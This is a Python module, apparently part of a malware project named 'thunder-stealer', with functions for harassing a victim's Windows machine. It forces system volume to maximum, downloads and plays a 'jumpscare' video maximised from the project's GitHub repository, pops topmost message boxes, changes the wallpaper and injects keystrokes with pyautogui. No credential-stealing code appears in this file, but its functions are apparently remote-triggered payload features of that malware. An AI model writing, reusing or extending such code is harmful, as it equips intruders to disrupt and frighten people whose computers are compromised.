import ctypes
import threading
import requests
import os
import win32gui, win32con
import time
import tempfile
import pyautogui
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame


MB_OK = 0x0
MB_ICONINFORMATION = 0x40
MB_TOPMOST = 0x00040000

def show_message_box(title, message, style=0):
    ctypes.windll.user32.MessageBoxW(0, message, title, style | MB_TOPMOST)

def show_message_box_threaded(title, message, style=0):
    threading.Thread(target=show_message_box, args=(title, message, style), daemon=True).start()


class AudioPlayer:
    def __init__(self):
        pygame.mixer.init()
        self._player_thread = None
        self._stop_flag = threading.Event()

    def _play_audio(self, file_path):
        try:
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                if self._stop_flag.is_set():
                    pygame.mixer.music.stop()
                    break
        except Exception as e:
            print(f"Error during audio playback: {e}")

    def play(self, file_path):
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Audio file not found: {file_path}")
        self.stop()
        self._stop_flag.clear()
        self._player_thread = threading.Thread(target=self._play_audio, args=(file_path,))
        self._player_thread.daemon = True
        self._player_thread.start()

    def stop(self):
        if self._player_thread and self._player_thread.is_alive():
            self._stop_flag.set()
            self._player_thread.join()
            self._player_thread = None
            pygame.mixer.music.stop()


class VolumeControl:
    def __init__(self):
        self._set_volume_api = ctypes.windll.user32.SystemParametersInfoW

    def set_volume(self, volume: int):
        if not (0 <= volume <= 100):
            raise ValueError("Volume must be between 0 and 100.")
        try:
            volume_value = int(volume * 65535 / 100)
            ctypes.windll.winmm.waveOutSetVolume(0, volume_value | (volume_value << 16))
        except Exception as e:
            raise RuntimeError(f"Failed to set volume: {e}")

    def get_volume(self):
        try:
            volume = ctypes.c_uint()
            ctypes.windll.winmm.waveOutGetVolume(0, ctypes.byref(volume))
            volume_value = volume.value & 0xffff
            return int(volume_value * 100 / 65535)
        except Exception as e:
            raise RuntimeError(f"Failed to get volume: {e}")


class JumpscareHandler:
    def __init__(self):
        self.presets = {
            "jeff_jumpscare": "https://github.com/python312/thunder-stealer/raw/refs/heads/main/base/jumpscare.mp4",
            "goofy_jumpscare": "https://github.com/python312/thunder-stealer/raw/refs/heads/main/base/funny.mp4"
        }
        self.temp_file = None

    def download_video(self, preset_name):
        if preset_name not in self.presets:
            return f"Preset '{preset_name}' not found."
        video_url = self.presets[preset_name]
        self.temp_file = os.path.join(tempfile.gettempdir(), f'{preset_name}.mp4')
        if not os.path.exists(self.temp_file):
            response = requests.get(video_url, stream=True)
            if response.status_code == 200:
                with open(self.temp_file, 'wb') as file:
                    for chunk in response.iter_content(chunk_size=1024):
                        file.write(chunk)
                return f"'{preset_name}' video downloaded successfully."
            else:
                return f"Failed to download '{preset_name}'. HTTP status code: {response.status_code}"
        else:
            return f"'{preset_name}' video already exists. Using existing file."

    def set_volume_to_max(self):
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(1.0, None)
            return "Volume set to maximum."
        except Exception as e:
            return f"Failed to set volume: {e}"

    def play_video_and_maximize(self):
        if not self.temp_file or not os.path.exists(self.temp_file):
            return "No video found to play."
        try:
            os.startfile(self.temp_file)
            time.sleep(0.6)
            video_window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(video_window, win32con.SW_MAXIMIZE)
            return "Jumpscare has been triggered."
        except Exception as e:
            return f"Failed to play and maximize video: {e}"


def set_wallpaper(file_path):
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x1
    SPIF_SENDCHANGE = 0x2
    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"Wallpaper file not found: {file_path}")
    absolute_path = os.path.abspath(file_path)
    try:
        result = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, absolute_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )
        if not result:
            raise ctypes.WinError()
    except Exception as e:
        raise RuntimeError(f"Failed to set wallpaper: {e}")


def send_key_input(input: str):
    pyautogui.typewrite(input)
